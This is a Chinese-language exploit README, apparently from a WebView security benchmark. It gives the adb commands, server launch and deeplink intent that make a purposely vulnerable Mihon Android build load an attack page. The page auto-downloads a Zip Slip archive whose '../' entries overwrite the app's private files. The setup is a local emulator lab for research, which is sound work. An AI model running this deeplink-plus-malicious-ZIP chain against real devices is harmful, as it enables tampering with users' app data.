# 3.1.2 Insecure Download Callback EXP

## 漏洞触发点

Mihon 帮助页 deeplink `mihon://help/webview?url=<external_url>` 将外部 URL 交给 `WebViewActivity`。漏洞样本为 WebView 设置了 `DownloadListener`，下载完成后自动解压 ZIP 文件，但未校验压缩包内文件名是否包含路径穿梭（Zip Slip）。

攻击页面自动触发下载 `/malicious.zip`，压缩包内文件名使用 `../` 路径穿梭，解压后覆盖应用私有文件。

## 前置条件

1. 连接 MuMu 模拟器：

```powershell
adb connect 127.0.0.1:7555
```

2. 安装漏洞 APK（`apk/mihon-0.19.9/vuln/3.1.2.apk`）：

```powershell
adb -s 127.0.0.1:7555 install apk\mihon-0.19.9\vuln\3.1.2.apk
```

## 运行服务端

```powershell
cd "d:\Secsys\Webview Benchmark&自动化挖掘\Phrase 6\WebviewBench\exp\mihon-0.19.9\3.1.2_Insecure_Download_Callback"
python .\server.py
```

服务端监听 `0.0.0.0:8000`，攻击页面路径：`http://10.0.2.2:8000/exp/3.1.2`

恶意 ZIP 由服务端 `/malicious.zip` 提供。

## 触发 exploit

```powershell
adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW -d "mihon://help/webview?url=http%3A%2F%2F10.0.2.2%3A8000%2Fexp%2F3.1.2"
```

## 预期结果

WebView 加载攻击页面约 500ms 后自动触发下载。若应用自动解压且未校验路径，恶意文件将覆盖应用私有目录中的目标文件。
